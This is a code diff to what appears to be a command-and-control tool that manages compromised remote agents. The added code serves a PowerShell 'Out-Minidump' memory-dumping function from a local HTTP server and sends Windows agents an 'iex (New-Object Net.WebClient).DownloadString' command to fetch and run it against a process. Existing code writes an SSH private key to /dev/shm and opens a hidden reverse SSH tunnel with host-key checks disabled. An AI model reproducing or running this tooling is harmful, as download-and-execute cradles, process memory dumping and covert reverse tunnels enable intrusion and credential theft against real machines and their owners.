@@ -699,9 +699,9 @@ class Main:
                             return
                         proxy_target_agent = self.server.all_addresses[int(command[2])]
 
-                        if proxy_target_agent[-1].startswith('Windows'):
-                            self.print('** Invalid agent target. Windows hosts are not supported as a proxy agent (coming soon), but they can still be staged and you can still run shell commands on them. **')
-                            return
+                        #if proxy_target_agent[-1].startswith('Windows'):
+                        #    self.print('** Invalid agent target. Windows hosts are not supported as a proxy agent (coming soon), but they can still be staged and you can still run shell commands on them. **')
+                        #    return
 
                         print('Setting proxy target to agent {}...'.format(command[2]))
 
@@ -742,10 +742,104 @@ class Main:
                                 subprocess.run('service sshd restart', shell=True)
 
                         self.print('Telling remote agent to connect back...')
-                        shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
-                        connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_priv_key, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
+
+                        if proxy_target_agent[-1].startswith('Windows'):
+
+                            from http.server import BaseHTTPRequestHandler, HTTPServer
+
+                            class S(BaseHTTPRequestHandler):
+                                def _set_headers(self):
+                                    self.send_response(200)
+                                    self.send_header('Content-type', 'text/plain')
+                                    self.end_headers()
+
+                                def do_GET(self):
+                                    self._set_headers()
+                                    self.wfile.write(b"""function Out-Minidump
+{
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+        [System.Diagnostics.Process]
+        $Process,
+
+        [Parameter(Position = 1)]
+        [ValidateScript({ Test-Path $_ })]
+        [String]
+        $DumpFilePath = $PWD
+    )
+
+    BEGIN
+    {
+        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+        $MiniDumpWithFullMemory = [UInt32] 2
+    }
+
+    PROCESS
+    {
+        $ProcessId = $Process.Id
+        $ProcessName = $Process.Name
+        $ProcessHandle = $Process.Handle
+        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
+
+        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
+
+        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+
+        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
+                                                     $ProcessId,
+                                                     $FileStream.SafeFileHandle,
+                                                     $MiniDumpWithFullMemory,
+                                                     [IntPtr]::Zero,
+                                                     [IntPtr]::Zero,
+                                                     [IntPtr]::Zero))
+
+        $FileStream.Close()
+
+        if (-not $Result)
+        {
+            $Exception = New-Object ComponentModel.Win32Exception
+            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"
+            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
+
+            throw $ExceptionMessage
+        }
+        else
+        {
+            Get-ChildItem $ProcessDumpPath
+        }
+    }
+
+    END {}
+}"""
+                                    )
+                                    return
+        
+                            def run(server_class=HTTPServer, handler_class=S, port=80):
+                                server_address = ('0.0.0.0', port)
+                                httpd = server_class(server_address, handler_class)
+                                print('Starting httpd...')
+                                httpd.serve_forever()
+                            import threading
+                            t = threading.Thread(target=run, daemon=True)
+                            t.start()
+                            time.sleep(2)
+
+                            # Start a new thread
+                            # Start an HTTP server on it with the .ps1 file
+                            # Continue to send the connect_back_cmd
+                            # Kill HTTP server
+
+                            connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/asd")); Out-MiniDump -Process $(Get-Process -Id 8172)'.format(proxy_ip, proxy_port) 
+                            #Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, proxy_ip, proxy_ssh_username, 'super-secret-password')
+                        else:
+                            shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
+                            connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_priv_key, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
-                        self.print('Remote agent connected!')
+                        self.print('Remote agent instructed to connect!')
                 except Exception as error:
                     self.print('** Invalid agent ID, expected an integer or "none": {} **'.format(error))
             else:
